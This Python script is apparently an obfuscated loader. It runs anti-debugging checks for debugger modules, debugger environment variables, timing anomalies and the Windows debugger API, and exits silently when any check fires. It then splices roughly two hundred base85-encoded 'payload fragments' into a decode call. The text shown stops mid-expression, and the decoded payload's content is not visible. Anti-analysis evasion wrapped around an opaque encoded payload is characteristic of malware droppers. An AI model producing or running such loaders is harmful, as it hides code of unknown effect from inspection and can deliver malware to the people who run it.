#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cpsu4442ZMSqXP = '?O+8T=idbpBTW5TyLUWo+{pv(bFi!dzG9$`ATk5a{2$S<o2FF;L&;R{!+VT'
_ceIncVdDdClJpM = '!zjImxB1Zc^u~?&mqIi}98UKHQ2cH<>P(l|BVoPxps369LbwxE2ahN<!7Vl'
_cjTtqFZaz_QTTF = 'evQOPAZ8_C-sH&PZ2g?K<e(c-73f|gm3r-iA4VQugT(E5rRLXd?~$3Ed{X$'
_cjUztVVdBXRENd = 'Yf8X5I!{wADS6YD}e;z^#Qcs>C;OcX)(HG$y?@DP)j)9Q1@}s4RR?y*#VF5'
_cbLyt2jX1bMb0P = '{8XSh6{h3W4$|(U%+FR*o^8<P{rBO7eGBhlQN8>H08<D%eqqR!g9A-TJ38>'
_cpnEiONU7M0kMo = 'wthx3B68Pa!VRAmg^saALRZBFV$ojc!7Uc;+U$&j)!rDmRd_7Faq7z!on(K'
_cpc6EqWYPVTX5K = '5mX;^BTn?k?z&G2m&;@<rogvug>v3|Q0e7U27o8%@hCq)baP{%kh^y6^)#Y'
_cfbWjW8rU86yE5 = 'FAZ3T4ct3Rgf!QyMhWVfAY$1<5%U->dciE$YpjnD~KgDk*Prb0SbH!*{5eH'
_cz6IPZaAo_fHiO = 't_T3~I$-R|_A3zKHsB+SC~>x$_3v>3a~MT%7309mNTR!@HLvb0Iq`DA#Oz4'
_cnHcyr5JPmDVCS = '%kGH!K7G|L}i-p!hhF%{i_YpTUa%l3C=`T15#BUdaY%tM=izVYWMN*abO!p'
_ceSQvAHbighdOQ = 'eU|?)vfg`bBA&#9ZGVX^gSlA4;Y4;%jbwCY|IFF7utj}v#PYKI^?&ARXC;Q'
_cjqbuC8KeZI0Gz = 'okw-MX$)Q@p-9sEghL)_ev8_Co_4Zq4QjepoNr8YxYIw29ChOj;>x7@%d+('
_cujYBBpcmVgnAk = '_))@>w71Zav3v^|k+(&WfUb;3N8{igLH@pCl`0f0v;DM)Uq#7H;BzJW4o)z'
_cpvuE0S1Zam4Od = 'i^4W^?;<Vz$f)Ar(K2*;G}kQB6;S;XHQl(H9V#z~(}H>mzz=SZXCPW*B86P'
_czeow75LAhubbe = 'MP577zHQT#~2x<Y?U{x#UFMj>;ZhU)k7ZwOC^Y{;9WG#w`hBcHqB1iXRQXa'
_ckakaGfDG135bb = 'gmV?-xSO1Rm+BDTDo_hSCAwUl8->-6Deu_4BGJzcC(PTr;ngs{baVNxvlUZ'
_ch2S3fMP1kg81k = 'wQhn4%QL&oCJCcIsehy=g=z&baVdQpcO(|w-Ml-8po{@$UM1fIVdN^Kfe6#'
_cgFKukmKkIvWO2 = '9;4~MW$fYWgVQgy*A2E(bb6|P7%D__d@%)tdh3+f-Y_7UHnJn(?dat`F2x;'
_ccYbYt2z3cWwTT = 'BgA*8`@p$Aq>5#ysSKBF{^u(psJ;?WZd++0#>rHfR$|i<cHd7M)3fM}dDmw'
_caOBy0ftBki3zT = 'uILK@cy3My7s@cLuqZuPYPej-25`w!nsfib;ZdeIO4*ncXo`X%`6apqI7uc'
_cgOFEEgtqAcprG = 'tP&gWRarH7Zt91nv$D)>cFnDIgE5RFF9*(&bl$l3ks2}$RBxV10<NTkJ-M)'
_c_VWHWTxbne1wT = 'czOgZmsCL|q5B~Fiz#L7fn%-9svrkHAQz>Z-0i!e_hUCAN8KOwF5`OU^Uyw'
_cxgqOCucS8ajWI = 'w+`5Q@O>bcNE(%D=H29F5XJ#Dt|cZMWhruowznjbQc_@euY$l5CV%w{r?Vx'
_ccQc1tsIiG_uRq = '$zYx{nOoC=$?M1W#;PXQ-_J5f$D4<9xPR-)>ye6Wsp^?ZTMk;HQ*3V36xJ!'
_cyTuc2BoNCYBhY = 'POY9g0B_+iSs%gBygleDs#wQt0>%SFg=@uQd}Fn{@w&|$A_6)Q}#{tawmec'
_csAdDydCO3AIRP = '?UQp}$W>NL#~O>-STX7j9gevk)Z6^=6|Ki{WH1RO&ImLD;_oU~bpHmNY{W='
_cmy4N2kbJqnruY = 'haNIp8bH*Nj7Kg;|r%?7?4`JtI5QW3NBi+3FS(Jd$*{>DvU1kcZaB$FH4ou'
_cqCd73PkTukfn8 = '|xvy8+jYgDC5l84S@^K2*eXrT!U@)NnY#ysHXU?x)+9SY*_NVUKzd^O3bTM'
_cb5cdQeLAYE_PK = '_hV)Nv<|k6D`uQtn)x#v<L#x3w{Csr+X2Z?1Zn9>n@l;^sj^Ld6}jIyXJZQ'
_cqCNJrtMHvUdln = 'EUIuAFVI!1OZa}ILUo2$KI)%f+$91fI5=Gzel}nnj<><h}50{W8hWy1qKsK'
_cp7I4OQVmxLexE = '{OM>l0IL^hNNO05)v63dG++{BFWmYT9Hb}BNALPt0N^wiYPGx@Rpg~)V+h-'
_cthj3oGlj3ppml = 'Hr<&{dD8}!k9dCAU3ZsxCqiNg*ybX;?XokvrOxHT4@nGo-Ueh`%SNGKb_A8'
_ce7vBkSsQt4Exw = '!8nEJ&UI>tN97?`xXF)1MM^EDJe7GB{lrr(M&UdzNeR#zyu?SjhA{?sm+?1'
_cj46jdZo_eHunO = '?_ACsgaSaWFCrCkWE8%p1^QRU>#<K8%tG$a|O0iK<7(m1lH$tKt$Y$<tY10'
_coJ82N9aYzcm1R = '&FNp3axnKpj0R<QcDTfgRXObhgK-1lpJ<mi!31qAYFqk#5PlNS=s2KXZTi&'
_coHFDSLNUdJwed = 'Pzc-pmYIGLr!n()jucBsoy=)(WgzCT5W+JAv17;Y$xPdlS^XP`7G8JH!wbI'
_cltH7IRIquOkvH = 'SF)b72C(ymlAl8@!xU2x)0NNS4Em0!q>|p0Mt%Js6<`dS7az}yjRdu1jpi$'
_ctIrq138QlNy56 = '`9B%H~>d+uhQ^7Vwim!D*ww%RNTTpzDE8B#s)QH*I^ZoSo_?j`z}(vr{_Yh'
_cw6sWb2O1lkQNO = ')_@H3j2sp?_}hk)190!ILF?zz_FxC9Lc2%y|)zX_oI&BTT8rHU~k%cpMOt<'
_canp66WWRF6qxG = '|u0k3}_FNB-t3KwOjTLV7fFJ_2%>ett-syD6w}#BJm07VX1F>9xLtJU?}hE'
_cjeGsJzKbpQPz9 = '2yaWGRon~f(Le_41AZ+_F0Q*=vIHyNADCVjX^+aWxI;h^K@?reUGB1+6Na$'
_ctMztVmoT7Z47l = '^+~t(cu~3SVWV!h+WOitzm<Kl9R6Os+_cvlS<@L+NTxb)9Z<~w<OB090#K}'
_cb_urI7wt1UlOW = 'AM&JbQv2$!4L2&6h$2mj`3Wz4H{iU<`h<WfZkavP)yF2Fg)oW-G5o2s-5E)'
_cvcrrJI5Gz3RbF = 'YsbEx=ve@S~E(*elQt%8D_oT_5NzmQEU!&AM72C^-eGe0N2Ik_J$YP7*C6t'
_cqFrFlzFqPqhdR = '2815ft9A-c{AF>{QjS5l+gj+G38wAnD3kS)Q0te@L{`Iuje@4T74M;sL3N_'
_cienlMIXQGtqiW = 'ipj}hI#9-ds5h0IE_Wo-*yHf;6Xs)sdRmw%X1T=^^wj*M0F3*TQanDBZiDw'
_cn1Tnc4m1DOEVP = '<$yQ4!&If@^jYw@w?ERT`0BA`HUYl77Sy4{ihS8(Ghn)?ctj7#F5<dcBo@l'
_cuLY16BfMPbKHQ = '`dLEP!`uBoM4D4?V)txfr86}!+@*xL_BZoLvIBfFX+$Rc8Tlosg`2U0)-q)'
_cvsUgkfO4Txmfn = 'tMY^|Z}BiFJlKX9x6XeonXnDf-Xo(6$GVOvB6@r-NUSP{8q&%~Tr+7dXy3l'
_cn7h6IDlfx2FOJ = '#<&?mdrF)Cb(v_KLKDu!0)pA3X2u5s7)eIAOHXC05Ph>7aAdF@zhR$1JszL'
_caIit7vjn9Kdxi = 'NMlYAu7XZFTs=|Dgpe_KRK}J#7W?yszh?^OknCqvX)td8XyUkT6A9d<rT$0'
_ctjVkWg2Na3Y1u = '?w}$VrFcp>P{581MYb+P>po)sA6xa&t|42p3-x|z5z=?|6*guFl*#b&AO(z'
_cvRBBYDJK1HsEX = 'rhhuywp<Bte^sZnHwD%{e_NNIzsYErU(mdz%|=Wrc+{)=Awk<#SPpa}5KoO'
_crZM3eY4TmMwen = '4Z-dKYy$v$61cV)1|;8lc$>2Fqd60BY3hid;`MVkh|x@W(edBwRjVyCglan'
_ci_Jhm84lKlHAf = '(kdE96YXB(V#gnM)Eaw-Kd>l{rgdAh!EF905of=KZSJX7}upWoUNRakQxIs'
_ceG7dBBgYLxsmq = 'dwj)O{S|vGhE6!ZPtzyJUXDtybmSHaLaK={E0W-sW&-x{yroV2VJ8yG43}I'
_c_f5oCnGkj8_7R = 'VAo`Nd36k#A1CAOp=ke8X{ueMaKfU@I5;EbdK#~hXLOY&k(V$6D_t<H!arw'
_ci0HnCYu5QXOCz = 'ThOck_eqv@TM2R`nl=~c}xY*RMuOwNE#22mYMd66!GAK3zvp(W}+<2&21@z'
_cps97DlDVNk7hM = 'UG#l0ohEZ2h8NTX*j!!~`CGdcN(E5;-(l0{>z=2GW+py4S?E-0N>^J-Jln+'
_ce4C6xRY46WA8T = 'F<WneRWUVySkk-b$j#(&P43f58+>jj>n`EP6sy;VJltZh&!w0A~>Cnxa8g-'
_ctbyhI1cyP6SGo = '_&pyoG5?nHuF-fj!Mg<+s~-*Bbv_R>)0Kg=X~zCj8yqVJ_)@z*@H?n9&K)j'
_chi_B9TPTh6x8_ = '0>@u;eX3q=pOrb0N=CZn6F6K)*+b?OoeblZfrv<wtn7VByA_Gk-7viW!Kfz'
_ctaiVCNIQlBRhm = 'eLj!6p8p}%Zm=jnI^t-{X)IPW>k;idnF9v7;o%EOS7i)Z85347c<#ut&i)9'
_cwC9WwRSK63Nnu = '`#Z#RDm1Zq;M-Kb;sB@Jh5{2V$d&4&8fez0yq9{lHTZH`HhGzrH{>>(Wm4o'
_coUGFH8URvnDO1 = 'zc`D#+kJZS)ERSh;=z_NLn1rv6)`n#1K+o1?QYRwlP{QZ%V}p>pmdx4g({P'
_cqaqvQzoB5PMh7 = 'aQFy#q4lj9LO(3bW5X=D6Dk)G_P==+Z!<JL-d0qSnGP=G`XX7al>VfN-mXc'
_ctwRv5ek_LDS90 = 'F#63SVvF?Z@?U~+8PONL_-M?)Ja?405Wljn2_t<wjq*TtHV7bb25qccFbIX'
_coLf7J43KBaNc_ = '=Kf$iz|bdRgmZ=WG99iuoahs5cr2I!GS2njgHCT~YaMCX`eq!>>f-Me0g0C'
_cp06UdvdWNqzU8 = 'Z$<5Mw!s&fMpyY>LiiY=$~;$3u`ZQ5GKgCxRa@jq;s^HnDIpCfU_B&&3Hfm'
_ce7OerpjY_6SiO = 'F{w*LN~!fjgI3J+0%!@2A^(10WV4Q+qa)5l_{z?O-JHYHiC#%77r)R1i$G!'
_c_URz_I6c9fy2j = 'X)_L6;{vCnEZ9}w3{f)ovOR^<Y9<=X26;@*SB&ri9rqw1=<vXcZ<^2Q&Y#z'
_cnwMEOFoGqUijZ = 'B<PFDCWaEBt+k_S}<L32E*vS+y+=<4XlZ1b5XwcF&3mvytF9En?FYe-Gjf~'
_cfyRWrY3oLnK2e = '0@8+{Ccc*F%IyeyYXKqcA5Zq9w!wXai3wofki9~4l)azKt+g~Z*o0>rCw;?'
_cybteTyly5Pp9t = '4{U3>~}AWBwx9eMuZs3V$s|NsikIVF3*qs>VMCZF(Q)OwKi@YlCx&4JciMW'
_cdTSGTHwMOfBrT = 'W!BinkX-c825BFgVbjM0&jcA`v+XeXui30uF>$u*dZG_+anXM=rj`Nel^a4'
_csPD0csA1R4YOT = '?*J@gfp(^XKmeaIwJ!M1)zET7#_(-mOTg{@ZW1GgOugm9byn}Hh4Px_tgJe'
_cudsfyyPeWM8nA = ';0VLDbx>TSA_+5&u9oBffqII}0b1Sh2C8PKn48#YFQHJ)FymLr8iOXafWt!'
_cuojkxSM29WOK1 = 'h$h?Dj(dV2}pa3;(x&r6C=sPiUFdo9P&OF!%KG%Sh0v4+gL(lif;e83P!Sx'
_cnj5Wj36eOMKve = '1Jb{_OIg+=ENVBhtE4XufRG@!n(F^UM{JFs=6L&jibcJXCpk+`8(zLV@$Hi'
_cqJwefRxqT0Ets = 'ieT<$IzUJ@>^yOs-)>MI2_gKSQ<cBtP5CwQ@kN;{ne;&_D>Y?n{`LPa1w6I'
_cksBHpHY6T6xW5 = '^~Gms#Z*P4U2LM1ajsr{+i!Uik<U6Q4V2J%0@k>ks%#Xrc`^(?H^omcg*x_'
_crD03dsoCOP_bQ = 'v+9-Fjg4Ygg8Xfi+NFuAqwkLjMKZaVXzZPGU|Bv716d}LrH1xvID8g}ruc-'
_cg57sk2Zfmrjac = '{LL5G!x?a+5CGC{-BdUpY!%?u@{7C-Jr|MBf;1NAv}x9+b#b3P^t?)l6aZ>'
_cktsElftmEeGXu = 'z6?MjSx?5OZC5BvEh28jWC<MlsphsO5{8N?o-xQc5n1dJ4&0Whd)0W!J>fQ'
_crIrxAV4mdj_47 = 'a$f}+bJeW9Zw!Z6)MNE%g~Eqg3>0FzPgNY&_Z(F5OWv7E-!e_-78OTLWV}o'
_cnIbyXjbMu2Z4P = 'geZD?q8~W?SVAHk@rqYhRs{5_0v>xTVBrGw`sIUnR<@Ir?9_R#BTVd>#3AJ'
_clnACnsEvW1Aov = 'gLHY2_X@bYyjT`fdAb%L@fOG0=<8~5Z94MROcD^H{*+0UukEAIKOt0(x$8C'
_csH9mWsdmE_kJp = 'L}JqQD~nd}P{+ckx(n!o284+jWxy~`*!`VHYKR?I#V^u|n(j&R)Jzb$G71b'
_cxH0n51874iSFO = 'K}uas#;(i}aW$+lV?l7(F)s(I*rG@}}hwuv+;$ZC4Oro;p?xLnZf->-vAtC'
_csQSaGaEWjKcGR = 'x8-DLPoyl&lFaz%!*={NvGM(sr>M+wp8dHK!ocm*mEm<`m6M;kqSS4@c1R~'
_couVJPgMshA442 = '&Ea=VP7~;IJIA7+<%u4n|4e=yWpe;-%w0x!iwcGz4d8b#r|3EU8cloLPFlz'
_cxqyMHPxhUxOi6 = 'iXNddhA+P#y<;hPZ#We=Hfbcks6MvoA_?ugJq`^_+c+!>I(hz<*WOQr#fUC'
_cw1KKe5eMCK74m = 'h^iY2_!d>i@a^Wr5J(byGiB+PCplF=+~HM6YBzWHEz-oJU+r^k&gfFkI(eD'
_c_u7KoCfQsIAlY = 'b0()>Xk;(uln`@W@0+Nyrj_38cY^f?!fCtrq6CyVT_x&;a#FP_76lB>VdT*'
_czEBQhsb0eevwT = '~cffnz7ySlQSCYwl;+2I=?!4(w+Z?12+K?!yng@^r~$vxzAY<OVkI0KOwNJ'
_cqfiZwqn7SzmSQ = '?*&c#EaE1-wRe|MJ*9}v1XY5=-dc5CrjZ%tleup!rAd~$=AN<msRnN~7lvX'
_cfDa6hiwVWaOX6 = '8Y(cEtqC<8ZOmNmWHRv3;On_}<s9Y}hz^)Xb!3~xn3y#l+0ClMtH|I{dK&8'
_cmBLYI4QzzNLoX = '}QjT~k)+?uiX==BX$P%)*L>WSMeBbT?VchKlFg(3KR$nx2^Lg0e6Y%{f-Q2'
_ctMNsMOSA4Azk0 = 'k>#aylQUOLu9IT&pCRSBB5aNnO}w>~FJd^K9rF;%_$3Q{Av_@si{iSV9D_`'
_cdPn3wLlcfn2ep = 'u3;E0A{kzMEq&J!V#Aa0#hX~N}}L4AOlbdfL(@)xHzQdNUJGbEtny1=V*o&'
_crXHHUVu_EWEXS = '<oPwqd(?`FMy*E3IpFbX9s!Vr?%<qd1FR$UDynvrC(M&x%Pgx>d#*`<34p1'
_cvTGIu7sCJ9b9A = 'K^;)=PlE9p7_<p8C9Dv996tb~Az0;C<LI((_@vr&@VhGH2+^?HMyc7iqpL>'
_clrAmXw9qVdMh9 = '!bUT!L#ZpsahM^+Jk3p+%^@6u*M`w^glMt6qF#QK8cuap4e9HGktBChwlSh'
_cgtmwRwxnT72F4 = '@ry3@L_rFT(sscI9)dN<ho(<AC;eb|4r<svNy9PP4M`NT`tri-!6-bs~xZ^'
_cpyzI0wla1f7Y3 = '$L>MC<|6{QkN2ss+KzOsVntr{eVddl-Nls`0w{=n&T0dJuCTC5<gD9EKqR*'
_cn1BHL1vR7OIQh = '(l#98!OE)1N`7%4coHTUxcFMA>x-zn5a+LZeQrVfB9vxx2Xr=yiye_DDeW|'
_cwNd5uMiiphv4_ = '$*oATuXtVLMiW<OKhA%RKQSvk#DQm1Etp*IoDg`Q<1J|Y?#&kLz+1e!tVsV'
_ccbz3tNGPyBbWr = 'uGts;UHF_*KhspIyvstdJ3ugiUsF;}$1CfJ@0z9%|85E76ge^$EJZx1c;lj'
_cxVbhO8a4EMAcS = 'Z#%mOvR`!|gyKGa<c1f|am>W(iat?z3g`h`&JmiZQmW?8#XOdhMPQoLPi(_'
_ciqebIfwCIPGC_ = '|nry?%%}!AF(p8Tb2A4-R3v3Cfv#$C|2AVKW-{`fYRFDMgjwCEjcS|XfUAS'
_cqjdkV3Y6zFjaL = 'BH0PIt-()LTc~Oa5wscj&C==q0w=vn{wV&bNxqFD1dwbY&DchtSRh_Lvu5f'
_cljCZRxrW8LhVz = 'QmV23JhcraxPWWhbS`(bkvuC~Tt$|1VtEb8z(!n$WT(XNp2m~)+5B=fm0(-'
_cd34579c3Tt_6p = 'PeCg07l%|AOwiO+WMVF`L;`};s3<wA79Mk1xlx=fd)X#Z-^z=7<Pw{f+QW-'
_cliCdMcQfUecZU = 'E>02ro{AT!%e_Bv`D`^_y;TH-_JV${3e)<8x@<h(SOrT=_gR+$o_{xc7=DO'
_ceqWyztcrY1O_D = '-@w=uD$Fqzy2>mo`<t(Rm4y>`#Y;U850DV!fI&HjN*}ZB$Blwq!GrUN(F70'
_cuc1rGYGUvhwoO = 'PTG#p95yP^X>}CD6?gBumn=rBF7TBOIt6p2)!UP&S8@!<(3dgL<6bWWC2q)'
_cpjXezHfEohHM6 = '-_ZQ92dVV4J2{V^3vn6Rp$J*he>{fIpR)}}Zz`L2}4jXZ<NQmqUZi7kKMUl'
_czGvpGtidPAVZV = 'g{4SMM;*qcrpu5a~fTh~7paCX!M@qILQcUAs!?%cvuqL`%=&f#0SYl79nbK'
_cb2m1F43Vj5jKG = 'U9pJs;R!j>ZxG?4nf9d1>g*;9NQcuTdz;<J=Q=?DA7h0Izj2zmDqPRIm~PC'
_clGbgY8p563vmS = 'Oj;vEHxXDi%z-o<qrql(8zn^gzV=LcBU^g|20*Cicy0D98mjK>`XL&n4Sb2'
_cgLBBd7gG3Q_Sk = 'IpciPC2~>?juYJ+wTHB<F2*4Vg{ty1o^{*(rO%-Tc2LOoGpA?{tIqH*Q*?f'
_cuEezMm5qTxsEH = 'T;ol0yxJht+#W$Wli2_-?^^Q|kSPrg*DHtu;hSha&KF?lo74iaJ@tq5=pn('
_cjjToErqCVQJfx = 'H143Pc!krav?DGWDw4o(mt$;j-bqxNX)9rTV-a);EZA(CWD-L2GUc2r4oEq'
_clmzLlVD9WbmPQ = '>7ws|H+)hKTC)1u;_%N*p}^y#udXJ6D>zQnYuvRGF%2dYEJVU7t@oFc|<`w'
_cet49ihXIEt9ar = '1KK(VZb8som9~As52W`h)?f&1DSA_Hp~l)8QXN_qcVZ_pJduo%@I)PF5zvx'
_cxmDyDuvo9TZpP = 'I0Ap=0=?HeQK@ype0Cg_g=6~=k_J{4Ro@;|PhH*ug`EdsHJWx7pa`|7vy3N'
_cl2PH0oaxrjejT = 'WLdcd5`wh~UZj1wvtl*i`>>TOBOC5x3f>(9|C*G080xyx6FBua25PoR=s|@'
_c_MMrn0sPnjfOc = '65d?R5bzw}L?WG?80AY>U(4!HGWju5i+wC<HSa@45OBad*wv5d{Ii3i6j4o'
_coIc_QbikuDlib = 'XRqFZ_D+Lz-X-BYJL}-VsRvQ1kr=LV^p^0?m5O=080*QZo*S1jAlbh*IV^a'
_cq5VOTy2n_s7dV = '{^(Z2@`R=lDR&!=8PWYWk3|Jvj|;&KzL!@9GL>YEU;Ii4BMQ79qc_m2D+lI'
_ct1281x7MECWqS = '8fSVJhZ6bE_pvODm*9WAz0ie)hHwEQ7JtWU1<6y}ERu>WN<v?EB^jqbqJqq'
_ciu87K69aw6klH = 's#7tyRO0N=7xyn<}2~mA1$=rAW!oU&(C(YO_M$Zs{T2=7F^WRqLI$L_|(eg'
_cbQKE5VoMsgdSS = 'gfsWbXIBfSK5OnR+M&PxdEp)$^XF%p=4Mig%qTKkA(*t41E<DdaI;Y>=e*@'
_clyKWdBdKks4mM = 'mkCSqAEvI!e99Z|S*EX>YOwwtS_!AfA}gr(8xbFQuL+#`l2@hq4X$HL(Kjt'
_cmY5k6uYFG7OFR = '8@0|dH`Fu=f_a9T4QX;NI?)+f*p&i?67XB$iNKIL@Q~wX{l~8QL0UMZ6bgx'
_cwea_KMYd4WmYb = 'MCq+AHW)gL>TiLA&*9S<95QaCE9Wo6<$8feN-v=vNr_4NgP1Sc0q}kD-idI'
_cdhfuO_skU_rME = 'T8j?}$*o3(g$G75>BFSin4eY~KWK@z(Xc+(_%!8}&VXR6Y>Mrkr<MarZvH^'
_coNUla8dDWWZ0t = 'V$U<1)c&36KW>1cVD>+T;j96TR=lmC8J^A11q$1q+GRYu(0jE?@PVo!3*{6'
_cqwrMkk7loXrDW = 'Zt`GTT7bvXCX>g=WktR}E3Xix(3W9!0p+y8h+RY<R(m+631*y4j<;r!`RY@'
_clHsxe3QxiG8CX = 'zrdo82I3NF3g$$8;~V%4Ae#QYVe@`-+^@P*40w^!+oh5r3w;O50~m=12{h%'
_cfCQNmrvYUcumy = 'Ut^+onT}vE4B=!q=R1WGy6iokMU;v%16D6y?=G-GhRxe}-(Tg>Beje>{3b@'
_csZpFM3C8dcLbX = ';>;f>w_YIW-fY6f$L2<aF*3t7^FdMj|OO@R}nM{u3BCZYh#xlyJk{wqoU)T'
_cc8Naz8Y81At5F = 'H~qXN*Lf@46wLpSsYHqAFfWKXFvfFiiI`-Ec8MF{6LT3JLAYMM4=ZCY%1XK'
_c_7n9QDl4HC8jd = '>^nOlQtONm;ap#L@r32B_NalOY#nocfZYdQ?1a4_7ofdEu9Q9EDk2@_ZRZh'
_cmIGrimFUCSpdr = 'd9c_T*tg}F%A!x-dy#boWEMH;v$(LZJK|D@tyU;OfuWm@);KsyA-SqZR{3Y'
_cepqPQPoDCnsVJ = '*ZEo}0q?+)f&^?@EAEz^NBl9COyn_U?+U|&d7h4%+$li=NLPVLXMU3&yV)W'
_cw_BzAzTf1O337 = 'N@fuyXbLaR_c+PFxpD>56LI>Q+q~(|?^{M3OXlADVag0e%V2kMcg^x!IAtO'
_c_KL5q7jI_bFy9 = '7+ryLShDMvj3QQB_H+bo-)3#1b2C}bKbM>?Rq!Aw>Lz7|cp4Zcff_V5WA-!'
_cdGjQMILiAhAqp = 'VfL^VfSj5U+deLCxKSEFn4*0Lj1S5$#vLk0y&U#+a9h6QVQ~6FQ6UA6?vIq'
_clcP4DZtWtG2dU = 'SD<G7%;01+nz>KXr-<?8xVnrz!OpkH|BZN0&#8u%+}ZL#j9YI@Yvj#$JZri'
_cnLBOtx0ZwR3cL = 'r7YJ?abBGc&LqkfUg^F+CcOX!Y&M<`gz-ho*M|Gtg#KP|`n?D|Yu045WEAJ'
_cwJzvIyBab3GR5 = 'nf?$I#h9kL&SD$X=EXU~H0m|`Rp6!epl%L$PGeJf}`TB`-YN$VnppGEmb?~'
_cnh5luNZ_6J_wO = 'PA$vuRRH+;6*-vWYct|~%e6{s%RKaKY|xf%q|VD=j($q0%}-xKtioUIFHbk'
_cw0A4RVSVkpZZp = 'TLn#dzg@{s0djmyVcDu5B}^;JGYAYV)VEn{Sn7bkUE=#dw(+j`#QDi|WGNN'
_cwmjdsK9OvqQ42 = '-3`VSA`{&O@Ewu5$RAQ0LWYD4X?_YIQ`c@gH|Xs<a}@b0f~h^Fie}+${XxK'
_cke6f1cjG9dGEN = 't`(0AolNsgabdw+2gYE)x?9uOuqNJT#ZEKAmQ{*Dh->ZPzE3&(K_`w_%p3f'
_cz51Q5FZrMZQLE = '42K)xSo8t3KEo#%q-x+{ixf_RB9_oT;qU-lBlqNwm)M@YRflY%sy6e$tHu#'
_cbpm3Or_zfl8XM = 'Z~*+5_5$-La)Tr`J1#Ttq#bU|(1u7;FGIQ`e9lERN+Sqba$C%7j>Du1S=5Z'
_clBYLdASg63Dpv = 'Id3*g5Ch?X|^seuf5#l{Sf;&ndn5vZm-=+9)K<6K3DUqxneFy_-jOqR%%Do'
_cjZMNJbQbIG2yW = 'sO6m$Emr}Y|+4~9}cVq`J2yeZY#;x1<*(%KlLHSnF`k@;AkH{)*PJ_FWYRn'
_cfDqFbPbsh4ijw = 'YCa53hG^Mu9aFC*#fj+OdvdxXbBKA*TZ1wkn*CiIiyS|Ddp7sIM9b5Sc3tn'
_crEPfdbGal6HNY = '3+~1CZ-uwU05ZEzjt1K=`wM6YgU&n`=7kU-ILclML(fbs-JtG38%RX~qfKB'
_clwBrN6iNEmq3x = 'rAm$m<yQm0&?gmg_E5owbxR8z001@-&#tvwzMdNQJX&{SsbaD#Xt*I(OU5U'
_ctZPa6uqN3yYBe = 'F_k>=JOAYb$wX1=w&;!I!PEKuyCyCj8i@v_D{7%9m~47FvJUk4$pGrLy|P6'
_cpuXiVp_1CZHcP = '2`A;ZS`QG33FS=0zF?>^k|t`I|h-@n~C5lnL7g|KTY!_gOfas#|vJ9F*rQc'
_ciASA42pDatCFH = '0g^KON_iN?JFs-T6n<Xy5FW)45QeZyg*<r*EB~00lBUL9GuGw6u?Ls~j@MC'
_chIeqFDlLNQalR = '<Qi@=^>mzducsRB=DS#8=of9l8>X>^wZx_1D+`e7Tmo|7T3Z-q#-`LnJGdQ'
_crUYMHvfwaOkK3 = 'V*NzQbpq?{Zus+v^`oKLIYVB^*{KNKjYhgygSC{&MHK;7sEO2KLafa}<%nx'
_cliSrCbs0o_s66 = '?3^j4WUvQeMbNd~gQ_t=On@ubd_SLE6$F-~4Fb$X$)eJCu1Z3bB$=Ca8kac'
_cbx7M1ACUUkvUI = '3M%^ea~g`?NuoYFQ@eF!iyYxGuT%yolHlI!Z<elZV8_feMQ;rc~H<BzX1?v'
_cbyW5wP1Z0bJgG = '!)MjzxYF43r^c|lv}H&NVKo<k0X9`y#(%U%g;pXMomfdf{@E?AP}xslQIPU'
_cr_17CkGXvR3du = ';bU%D;WRba;*jb{!K6y(^-4vM>Vp31A+Z*4z*;)l8WJRKWC3tx?XiGauB-O'
_ceA4CgNyVMhiXI = 't-Acg+xdRF#DBCh%MH}!uxSX(t1!H9aNkSBXP0S;TC>`VLLik4pl_t&-zkY'
_ceAc3cRiSs6eC7 = 'w|E5aCE$hr0g!eK~l|6_j{}jQZvLk@hMC8QYBkSpzaoXltT-8u(`_dbXoX!'
_cqeSwg4ZVWW6od = 'jg$0`Z+$^lePRfIUPC83AZ@o=-GbB-nrdKdaGO;m8o2XIM@r=6)&Uqm*RhL'
_coeZjnHrxRMMH0 = '{pJQ;gtN54RtrOl?X7c3519NtxB)Z6dL3~;8kp#33D?;-Ia&eCgHBs;7>%Z'
_caNyuEdQ4U1U9s = 'Fz<OimZXU%u+B%pJXkjnd!=6z*HA&c*m+oG4@r|XKF$a8mg3c)4l22LB>@r'
_cljiU0Wn6bnD2P = 'WAcb1YdIxJ|DGm}C_@>xqe)oa=oD%Nfb!Lcs}Ys)^Gpq1Fg5!&jUsFYO@bz'
_c_SH0Gcc_ykHBa = 'OTUd7oI`;O#9J'

_pdE_xMs45bkEZb = __import__('base64').b85decode(_cpsu4442ZMSqXP + _ceIncVdDdClJpM + _cjTtqFZaz_QTTF + _cjUztVVdBXRENd + _cbLyt2jX1bMb0P + _cpnEiONU7M0kMo + _cpc6EqWYPVTX5K + _cfbWjW8rU86yE5 + _cz6IPZaAo_fHiO + _cnHcyr5JPmDVCS + _ceSQvAHbighdOQ + _cjqbuC8KeZI0Gz + _cujYBBpcmVgnAk + _cpvuE0S1Zam4Od + _czeow75LAhubbe + _ckakaGfDG135bb + _ch2S3fMP1kg81k + _cgFKukmKkIvWO2 + _ccYbYt2z3cWwTT + _caOBy0ftBki3zT + _cgOFEEgtqAcprG + _c_VWHWTxbne1wT + _cxgqOCucS8ajWI + _ccQc1tsIiG_uRq + _cyTuc2BoNCYBhY + _csAdDydCO3AIRP + _cmy4N2kbJqnruY + _cqCd73PkTukfn8 + _cb5cdQeLAYE_PK + _cqCNJrtMHvUdln + _cp7I4OQVmxLexE + _cthj3oGlj3ppml + _ce7vBkSsQt4Exw + _cj46jdZo_eHunO + _coJ82N9aYzcm1R + 